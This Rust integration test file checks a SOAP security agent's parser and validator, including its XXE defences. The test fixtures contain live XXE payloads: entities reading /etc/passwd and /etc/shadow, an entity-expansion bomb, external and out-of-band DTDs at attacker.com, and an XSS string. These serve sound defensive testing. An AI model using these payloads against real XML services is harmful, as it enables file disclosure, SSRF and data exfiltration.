//! Integration tests for the zentinel-agent-soap crate.
//!
//! These tests exercise the public API surface end-to-end, combining
//! parsing, validation, and configuration together.

use zentinel_agent_soap::config::{
    BodyValidationConfig, EnvelopeConfig, FailAction, OperationMode, OperationsConfig,
    SettingsConfig, SoapSecurityConfig, SoapVersion, WsSecurityConfig, XxePreventionConfig,
};
use zentinel_agent_soap::error::{soap_fault_response, SoapFaultVersion, Violation, ViolationCode};
use zentinel_agent_soap::parser::{parse_soap_action, parse_soap_envelope};
use zentinel_agent_soap::validator::SoapValidator;

// ============================================================================
// Helper: builds a config with all checks enabled for thorough validation
// ============================================================================

fn strict_config() -> SoapSecurityConfig {
    SoapSecurityConfig {
        version: "1".to_string(),
        settings: SettingsConfig {
            max_body_size: 1_048_576,
            debug_headers: false,
            fail_action: FailAction::Block,
            allowed_content_types: vec!["text/xml".to_string(), "application/soap+xml".to_string()],
        },
        envelope: EnvelopeConfig {
            enabled: true,
            require_valid_envelope: true,
            allowed_versions: vec![SoapVersion::Soap11, SoapVersion::Soap12],
            require_header: false,
            max_body_depth: 15,
        },
        ws_security: WsSecurityConfig {
            enabled: false,
            ..Default::default()
        },
        operations: OperationsConfig {
            enabled: true,
            mode: OperationMode::Allowlist,
            actions: vec![
                "Get*".to_string(),
                "List*".to_string(),
                "Search*".to_string(),
            ],
            rate_limits: Default::default(),
            require_soap_action_header: false,
            validate_action_match: false,
        },
        xxe_prevention: XxePreventionConfig {
            enabled: true,
            block_doctype: true,
            block_external_entities: true,
            block_processing_instructions: true,
            max_entity_expansions: 100,
        },
        body_validation: BodyValidationConfig {
            enabled: true,
            max_elements: 500,
            max_text_length: 32768,
            block_cdata: false,
            block_comments: false,
            required_namespaces: vec![],
        },
    }
}

// ============================================================================
// End-to-end: parse + validate good requests
// ============================================================================

#[test]
fn test_e2e_valid_soap_11_get_request() {
    let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <soap:Header>
    <m:RequestId xmlns:m="http://example.org/meta">REQ-12345</m:RequestId>
  </soap:Header>
  <soap:Body>
    <usr:GetUserProfile xmlns:usr="http://example.org/users/v2">
      <usr:UserId>42</usr:UserId>
      <usr:IncludeDetails>true</usr:IncludeDetails>
    </usr:GetUserProfile>
  </soap:Body>
</soap:Envelope>"#;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(strict_config());
    let result = validator.validate(&envelope, None);

    assert!(
        !result.has_violations(),
        "Expected no violations, got: {:?}",
        result.violations
    );
    assert_eq!(result.soap_version, Some(SoapVersion::Soap11));
    assert_eq!(result.operation, Some("GetUserProfile".to_string()));
    assert!(result.metrics.element_count > 0);
}

#[test]
fn test_e2e_valid_soap_12_search_request() {
    let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<soap12:Envelope xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <api:SearchProducts xmlns:api="http://example.org/catalog">
      <api:Query>wireless headphones</api:Query>
      <api:MaxResults>50</api:MaxResults>
      <api:Category>electronics</api:Category>
    </api:SearchProducts>
  </soap12:Body>
</soap12:Envelope>"#;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(strict_config());
    let result = validator.validate(&envelope, None);

    assert!(
        !result.has_violations(),
        "Expected no violations, got: {:?}",
        result.violations
    );
    assert_eq!(result.soap_version, Some(SoapVersion::Soap12));
    assert_eq!(result.operation, Some("SearchProducts".to_string()));
}

#[test]
fn test_e2e_valid_list_operation() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <svc:ListOrders xmlns:svc="http://example.org/orders">
      <svc:CustomerId>C-1001</svc:CustomerId>
      <svc:Status>pending</svc:Status>
    </svc:ListOrders>
  </soap:Body>
</soap:Envelope>"#;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(strict_config());
    let result = validator.validate(&envelope, None);

    assert!(!result.has_violations());
    assert_eq!(result.operation, Some("ListOrders".to_string()));
}

// ============================================================================
// End-to-end: parse + validate bad requests
// ============================================================================

#[test]
fn test_e2e_blocked_operation() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <adm:DeleteAllRecords xmlns:adm="http://example.org/admin"/>
  </soap:Body>
</soap:Envelope>"#;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(strict_config());
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::OperationNotAllowed));
}

#[test]
fn test_e2e_xxe_attack_blocked_at_parse() {
    let xml = r#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org/users">&xxe;</GetUser>
  </soap:Body>
</soap:Envelope>"#;

    let result = parse_soap_envelope(xml.as_bytes());
    assert!(result.is_err());
    let violation = result.unwrap_err();
    assert_eq!(violation.code, ViolationCode::DoctypeDetected);
}

#[test]
fn test_e2e_entity_expansion_attack() {
    let xml = r#"<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Payload>&c;</Payload>
  </soap:Body>
</soap:Envelope>"#;

    let result = parse_soap_envelope(xml.as_bytes());
    assert!(result.is_err());
    assert_eq!(result.unwrap_err().code, ViolationCode::DoctypeDetected);
}

#[test]
fn test_e2e_non_soap_xml_rejected() {
    let xml = r#"<?xml version="1.0"?>
<root>
  <message>This is not a SOAP message</message>
</root>"#;

    let result = parse_soap_envelope(xml.as_bytes());
    assert!(result.is_err());
    assert_eq!(result.unwrap_err().code, ViolationCode::MissingEnvelope);
}

#[test]
fn test_e2e_malformed_xml_rejected() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <unclosed_tag>
  </soap:Body>
</soap:Envelope>"#;

    let result = parse_soap_envelope(xml.as_bytes());
    assert!(result.is_err());
    assert_eq!(result.unwrap_err().code, ViolationCode::InvalidXml);
}

// ============================================================================
// End-to-end: multiple violation accumulation
// ============================================================================

#[test]
fn test_e2e_multiple_violations() {
    // SOAP 1.2 (only 1.1 allowed) + deep nesting + blocked operation
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <adm:PurgeDatabase xmlns:adm="http://example.org/admin">
      <a><b><c><d><e><f><g><h><i><j><k><l><m><n><o><p>deep</p></o></n></m></l></k></j></i></h></g></f></e></d></c></b></a>
    </adm:PurgeDatabase>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.envelope.allowed_versions = vec![SoapVersion::Soap11]; // Only SOAP 1.1
    config.envelope.max_body_depth = 5; // Low depth limit

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    // Should have at least version mismatch, depth exceeded, and operation blocked
    let codes: Vec<ViolationCode> = result.violations.iter().map(|v| v.code).collect();
    assert!(codes.contains(&ViolationCode::UnsupportedVersion));
    assert!(codes.contains(&ViolationCode::BodyDepthExceeded));
    assert!(codes.contains(&ViolationCode::OperationNotAllowed));
}

// ============================================================================
// End-to-end: SOAP fault generation from violations
// ============================================================================

#[test]
fn test_e2e_fault_from_violations() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <adm:DropTable xmlns:adm="http://example.org/admin"/>
  </soap:Body>
</soap:Envelope>"#;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(strict_config());
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());

    // Generate SOAP fault from the violations
    let fault = soap_fault_response(&result.violations, Some(SoapFaultVersion::Soap11));

    assert!(fault.contains("<?xml version=\"1.0\""));
    assert!(fault.contains("soap:Fault"));
    assert!(fault.contains("OPERATION_NOT_ALLOWED"));
    assert!(fault.contains("zentinel:violation"));
}

#[test]
fn test_e2e_soap_12_fault_generation() {
    let violations = vec![
        Violation::new(ViolationCode::DoctypeDetected, "DOCTYPE found in request"),
        Violation::new(
            ViolationCode::ExternalEntityDetected,
            "Entity declaration found",
        ),
    ];

    let fault = soap_fault_response(&violations, Some(SoapFaultVersion::Soap12));

    assert!(fault.contains("http://www.w3.org/2003/05/soap-envelope"));
    assert!(fault.contains("soap:Sender"));
    assert!(fault.contains("DOCTYPE_DETECTED"));
    assert!(fault.contains("EXTERNAL_ENTITY_DETECTED"));
}

// ============================================================================
// End-to-end: WS-Security validation
// ============================================================================

#[test]
fn test_e2e_ws_security_required_but_absent() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.ws_security.enabled = true;
    config.ws_security.require_security_header = true;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::MissingSecurityHeader));
}

#[test]
fn test_e2e_ws_security_with_header_passes() {
    let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
                   xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <wsu:Timestamp>
        <wsu:Created>2025-06-15T12:00:00Z</wsu:Created>
        <wsu:Expires>2025-06-15T12:05:00Z</wsu:Expires>
      </wsu:Timestamp>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.ws_security.enabled = true;
    config.ws_security.require_security_header = true;
    // Don't require timestamp for this test (since we can't easily set "now")
    config.ws_security.require_timestamp = false;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    // Should not have MissingSecurityHeader
    assert!(
        !result
            .violations
            .iter()
            .any(|v| v.code == ViolationCode::MissingSecurityHeader),
        "Unexpected violations: {:?}",
        result.violations
    );
}

// ============================================================================
// End-to-end: body validation
// ============================================================================

#[test]
fn test_e2e_body_too_many_elements() {
    let mut elements = String::new();
    for i in 0..100 {
        elements.push_str(&format!("<item{i}>val{i}</item{i}>"));
    }
    let xml = format!(
        r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetResults xmlns="http://example.org/data">{}</GetResults>
  </soap:Body>
</soap:Envelope>"#,
        elements
    );

    let mut config = strict_config();
    config.body_validation.max_elements = 50;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::TooManyElements));
}

#[test]
fn test_e2e_body_cdata_blocked_when_configured() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetData xmlns="http://example.org/data">
      <Content><![CDATA[<script>alert('xss')</script>]]></Content>
    </GetData>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.body_validation.block_cdata = true;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::CdataNotAllowed));
}

#[test]
fn test_e2e_required_namespace_enforced() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetUser xmlns:m="http://example.org/users">
      <m:UserId>1</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.body_validation.required_namespaces = vec!["http://example.org/MANDATORY".to_string()];

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::MissingNamespace));
}

// ============================================================================
// End-to-end: operation control with SOAPAction
// ============================================================================

#[test]
fn test_e2e_soap_action_mismatch_detected() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.operations.validate_action_match = true;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, Some("UpdateUser"));

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::SoapActionMismatch));
}

#[test]
fn test_e2e_soap_action_match_with_uri_suffix() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.operations.validate_action_match = true;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, Some("http://example.org/users/GetUser"));

    assert!(
        !result
            .violations
            .iter()
            .any(|v| v.code == ViolationCode::SoapActionMismatch),
        "Unexpected mismatch violations: {:?}",
        result.violations
    );
}

#[test]
fn test_e2e_require_soap_action_header() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.operations.require_soap_action_header = true;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::MissingSoapAction));
}

// ============================================================================
// End-to-end: denylist mode
// ============================================================================

#[test]
fn test_e2e_denylist_blocks_matching_operations() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DeleteUser xmlns="http://example.org/admin"/>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.operations.mode = OperationMode::Denylist;
    config.operations.actions = vec![
        "Delete*".to_string(),
        "Drop*".to_string(),
        "Purge*".to_string(),
    ];

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(result.has_violations());
    assert!(result
        .violations
        .iter()
        .any(|v| v.code == ViolationCode::OperationNotAllowed));
}

#[test]
fn test_e2e_denylist_allows_non_matching_operations() {
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org/users"/>
  </soap:Body>
</soap:Envelope>"#;

    let mut config = strict_config();
    config.operations.mode = OperationMode::Denylist;
    config.operations.actions = vec!["Delete*".to_string(), "Drop*".to_string()];

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    // GetUser should not match Delete* or Drop*
    assert!(
        !result
            .violations
            .iter()
            .any(|v| v.code == ViolationCode::OperationNotAllowed),
        "Unexpected violations: {:?}",
        result.violations
    );
}

// ============================================================================
// End-to-end: configuration from YAML string
// ============================================================================

#[test]
fn test_e2e_config_from_yaml_and_validate() {
    let yaml = r#"
version: "1"
settings:
  max_body_size: 524288
  debug_headers: false
  fail_action: block
envelope:
  enabled: true
  max_body_depth: 10
  allowed_versions:
    - "1.1"
  require_header: true
operations:
  enabled: true
  mode: denylist
  actions:
    - "Delete*"
    - "Drop*"
body_validation:
  enabled: true
  max_elements: 200
  block_cdata: true
  block_comments: true
"#;

    let config: SoapSecurityConfig = serde_yaml::from_str(yaml).unwrap();
    assert!(config.envelope.require_header);
    assert_eq!(config.envelope.max_body_depth, 10);
    assert_eq!(config.operations.mode, OperationMode::Denylist);
    assert!(config.body_validation.block_cdata);
    assert!(config.body_validation.block_comments);

    // Use the parsed config to validate a request
    let xml = r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <auth:Token xmlns:auth="http://example.org/auth">secret</auth:Token>
  </soap:Header>
  <soap:Body>
    <svc:GetReport xmlns:svc="http://example.org/reporting">
      <svc:ReportId>R-100</svc:ReportId>
    </svc:GetReport>
  </soap:Body>
</soap:Envelope>"#;

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(
        !result.has_violations(),
        "Expected no violations, got: {:?}",
        result.violations
    );
}

// ============================================================================
// End-to-end: parse_soap_action utility
// ============================================================================

#[test]
fn test_e2e_parse_soap_action_various_formats() {
    // Quoted
    assert_eq!(parse_soap_action("\"GetUser\""), "GetUser");
    // Unquoted
    assert_eq!(parse_soap_action("GetUser"), "GetUser");
    // With namespace
    assert_eq!(
        parse_soap_action("\"http://example.org/GetUser\""),
        "http://example.org/GetUser"
    );
    // Whitespace padded
    assert_eq!(parse_soap_action("  \"ListOrders\"  "), "ListOrders");
    // Empty
    assert_eq!(parse_soap_action(""), "");
    assert_eq!(parse_soap_action("\"\""), "");
}

// ============================================================================
// Regression: XXE variants
// ============================================================================

#[test]
fn test_e2e_xxe_ssrf_via_external_dtd() {
    let xml = r#"<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

    let result = parse_soap_envelope(xml.as_bytes());
    assert!(result.is_err());
}

#[test]
fn test_e2e_xxe_oob_exfiltration() {
    let xml = r#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % asd SYSTEM "http://attacker.com/xxe.dtd">
  %asd;
  %c;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><GetUser/></soap:Body>
</soap:Envelope>"#;

    let result = parse_soap_envelope(xml.as_bytes());
    assert!(result.is_err());
}

#[test]
fn test_e2e_xxe_local_file_read() {
    let xml = r#"<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://example.org">&xxe;</GetUser>
  </soap:Body>
</soap:Envelope>"#;

    let result = parse_soap_envelope(xml.as_bytes());
    assert!(result.is_err());
}

// ============================================================================
// Edge case: very large but valid SOAP message
// ============================================================================

#[test]
fn test_e2e_large_valid_soap_message() {
    let mut items = String::new();
    for i in 0..200 {
        items.push_str(&format!(
            "<item xmlns=\"http://example.org/data\"><id>{i}</id><name>Item {i}</name><desc>Description for item {i}</desc></item>"
        ));
    }
    let xml = format!(
        r#"<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetBatch xmlns="http://example.org/data">{}</GetBatch>
  </soap:Body>
</soap:Envelope>"#,
        items
    );

    let mut config = strict_config();
    config.body_validation.max_elements = 10000; // Allow many elements

    let envelope = parse_soap_envelope(xml.as_bytes()).unwrap();
    let validator = SoapValidator::new(config);
    let result = validator.validate(&envelope, None);

    assert!(
        !result
            .violations
            .iter()
            .any(|v| v.code == ViolationCode::TooManyElements),
        "Unexpected violations: {:?}",
        result.violations
    );
    // GetBatch matches Get* pattern
    assert_eq!(result.operation, Some("GetBatch".to_string()));
}
